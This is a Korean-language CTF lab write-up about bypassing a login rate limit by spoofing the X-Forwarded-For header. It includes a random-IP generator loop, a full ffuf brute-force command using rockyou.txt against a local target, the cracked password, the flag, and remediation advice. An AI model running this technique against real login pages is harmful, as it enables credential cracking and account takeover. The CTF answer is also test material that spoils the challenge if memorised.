+++
title = "VulnABLE CTF [LUXORA] Write-up: Brute Force 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Brute Force", "Silver", "IP Rotation", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Brute Force 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Authentication Layer (Brute Force)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/brute/silver`
- **목표**: 5회 이상 로그인 실패 시 해당 IP를 차단하는 Rate Limiting 정책을 `X-Forwarded-For` 헤더 스푸핑(IP Rotation)을 통해 우회하여 비밀번호를 크래킹하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 분석 (Reconnaissance)

`/brute/silver` 관리자 로그인 페이지에 접근합니다. 타겟 계정은 동일하게 `testadmin` 입니다.
수동으로 비밀번호를 5번 연속으로 틀리게 입력해봅니다.

**[6번째 로그인 시도 결과]**
```http
HTTP/1.1 429 Too Many Requests
Content-Type: application/json

{
  "error": "Too many failed login attempts from your IP. Please try again in 15 minutes."
}
```

**[해커의 사고 과정]**
1. Bronze 때와 달리 **IP 기반의 Rate Limiting**이 적용되어 있다.
2. 서버는 내가 보내는 요청의 IP 주소(나의 로컬 IP)를 기록하고 카운트하고 있다.
3. 웹 서버(Node.js 등)는 보통 로드밸런서나 리버스 프록시 뒤에 있기 때문에, 클라이언트의 진짜 IP를 알아내기 위해 HTTP 헤더인 `X-Forwarded-For` 나 `X-Real-IP` 에 의존하는 경우가 많다.
4. 만약 내가 직접 이 헤더를 매 요청마다 무작위로 바꿔서(스푸핑) 보낸다면? 서버는 매번 다른 사람이 접속하는 줄 알고 속아 넘어갈 것이다!

---

## 💥 2. Rate Limit 우회 전략 (Exploitation Strategy)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Brute Force / FFuF)--> [ Web Server ]
             |-- Pwd1                  |-- Invalid
             |-- Pwd2                  |-- Invalid
             |-- ...                   |-- ...
             |-- CorrectPwd            |-- Access Granted!
```


IP 스푸핑(Spoofing)을 적용하여 FFuF 페이로드를 다시 설계합니다.

### 💡 X-Forwarded-For (XFF) 스푸핑
HTTP 헤더에 `X-Forwarded-For: 123.45.67.89` 처럼 임의의 IP를 적어 보냅니다. 백엔드가 이 헤더를 최우선으로 신뢰한다면 Rate Limit 카운터는 해당 가짜 IP에 누적됩니다.

우리는 요청을 보낼 때마다 이 IP 값이 달라지게 만들어야 합니다. FFuF에서는 단어장(Wordlist)을 2개 사용하여 하나는 비밀번호, 하나는 가짜 IP 리스트로 사용할 수 있습니다.

**[가짜 IP 리스트 파일 생성 (`ips.txt`)]**
파이썬이나 쉘 스크립트로 1000개 정도의 무작위 IP 리스트를 만듭니다.
```bash
for i in {1..1000}; do echo "$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))" >> ips.txt; done
```

---

## 🚀 3. 공격 수행 및 익스플로잇 (Exploitation)

FFuF를 이용하여 듀얼 워드리스트 모드로 브루트포싱을 실행합니다.

```bash
# FFuF 명령어: W1은 비밀번호, W2는 가짜 IP
$ ffuf -w /usr/share/wordlists/rockyou.txt:W1 \
       -w ips.txt:W2 \
       -u http://localhost:3000/brute/silver \
       -X POST \
       -H "X-Forwarded-For: W2" \
       -d "username=testadmin&password=W1" \
       -H "Content-Type: application/x-www-form-urlencoded" \
       -fr "Invalid credentials|Too many failed"
```

### 🔍 서버의 반응
서버는 매 요청마다 헤더에 적힌 `W2` (가짜 IP)를 새로운 방문자로 인식하여 429 에러(Too Many Requests)를 띄우지 않고 200 OK와 함께 로그인 실패 검증 로직을 계속 실행해 줍니다.

### 크래킹 결과
잠시 후 성공적인 응답 하나가 출력됩니다.

```text
password2024          [Status: 200, Size: 1250, Words: 300, Lines: 45, Duration: 20ms]
```

비밀번호가 `password2024` 임을 알아냈습니다! 이를 브라우저에서 입력하면 Silver 플래그를 획득할 수 있습니다.

---

## 🚩 4. 롸잇업 결론 및 플래그

**🔥 획득한 플래그:**
`FLAG{BRUTE_🥈_XFF_BYPASS_8C7D6E}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
사용자의 접속 IP를 식별할 때 클라이언트가 임의로 조작할 수 있는 HTTP 헤더에 지나치게 의존한 것이 원인입니다.

* **안전한 패치 가이드**
1. **헤더 신뢰성 검증**: 리버스 프록시(Nginx/HAProxy) 설정에서 외부 클라이언트가 직접 주입한 `X-Forwarded-For` 헤더는 무시(Drop)하고, 프록시가 직접 측정한 TCP 연결 IP만 백엔드로 전달하도록 구성해야 합니다.
2. **복합적 Rate Limiting**: IP뿐만 아니라 사용자 계정(`testadmin`) 자체에 대해서도 실패 횟수를 카운트하여, IP가 달라져도 계정이 잠기도록(Account Lockout) 이중 방어를 구축해야 합니다.